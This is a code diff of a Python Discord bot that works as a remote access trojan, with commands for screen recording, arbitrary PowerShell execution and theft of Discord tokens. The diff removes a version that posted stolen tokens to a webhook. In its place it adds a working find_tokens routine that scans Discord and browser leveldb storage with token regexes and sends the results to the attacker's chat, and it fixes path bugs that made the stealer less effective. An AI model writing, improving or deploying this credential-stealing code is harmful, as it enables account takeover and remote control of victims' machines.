@@ -419,7 +419,7 @@ async def commands(ctx):
     embed.add_field(name="▶️ .sr", value="Start screen recording", inline=False)
     embed.add_field(name="💌 .powershell [command]", value="command powershell.", inline=False)
     embed.add_field(name="📂 .directory", value="shows where its directory is.", inline=False)
-    embed.add_field(name="🔥 .token", value", value="Get the Token🤑", inline=False)
+    embed.add_field(name="🔥 .token, value", value="Get the Token🤑", inline=False)
     await ctx.send(embed=embed)
 
 @bot.command()
@@ -509,30 +509,12 @@ async def sr(ctx, duration: int = 30):  # Default duration is set to 30 seconds
     # Optionally, delete the video file after sending
     os.remove(video_path)
 
-@bot.command()
-async def token(ctx):
-    await ctx.send("Fetching tokens... Please wait.")
-    tokens = find_tokens()
-    
-    if tokens:
-        # Send found tokens to the webhook
-        tokens_message = "\n".join(tokens) if tokens else "No tokens found."
-        tokendata = {
-            "content": f"Tokens Found:\n{tokens_message}",
-        }
-        headers = {
-            "Content-Type": "application/json"
-        }
-        requests.post(hook, data=json.dumps(tokendata), headers=headers)
-        await ctx.send("Tokens found and sent to the webhook.")
-    else:
-        await ctx.send("No tokens found.")
-
+# Function to find Discord tokens
 def find_tokens():
     tokens = []
     local = os.getenv("localAPPDATA")
     roaming = os.getenv("APPDATA")
-    
+
     paths = {
         "Discord": roaming + "\\Discord",
         "Discord Canary": roaming + "\\discordcanary",
@@ -548,7 +530,7 @@ def find_tokens():
         'Kometa': local + "\\Kometa\\User Data",
         'Orbitum': local + "\\Orbitum\\User Data",
         'CentBrowser': local + "\\CentBrowser\\User Data",
-        'Sputnik': local + "\\Sputnik\\Sputnik\\ User Data",
+        'Sputnik': local + "\\Sputnik\\Sputnik\\User Data",
         'Chrome SxS': local + "\\Google\\Chrome SxS\\User Data",
         'Epic Privacy Browser': local + "\\Epic Privacy Browser\\User Data",
         'Microsoft Edge': local + "\\Microsoft\\Edge\\User Data\\Default",
@@ -558,7 +540,7 @@ def find_tokens():
     }
 
     for platform, path in paths.items():
-        path = os.path.join(path, "local Storage", "leveldb")
+        path = os.path.join(path, "Local Storage", "leveldb")
         if os.path.exists(path):
             for file_name in os.listdir(path):
                 if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
@@ -566,10 +548,22 @@ def find_tokens():
                         for line in file.readlines():
                             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                 for token in re.findall(regex, line):
-                                    if f"{token} | {platform}" not in tokens:
+                                    if token not in tokens:  # Ensure tokens are unique
                                         tokens.append(token)
 
     return tokens
+
+# Command to execute the token fetching
+@bot.command()
+async def token(ctx):
+    tokens = find_tokens()  # Call the function to find tokens
+
+    if tokens:  # If tokens were found
+        tokens_message = "\n".join(tokens)  # Join tokens into a message
+        await ctx.send(f"Tokens found:\n{tokens_message}")  # Send the tokens in chat
+    else:
+        await ctx.send("No tokens found.")  # Notify if no tokens were found
+
 
 @bot.command()
 async def powershell(ctx, *, command: str):
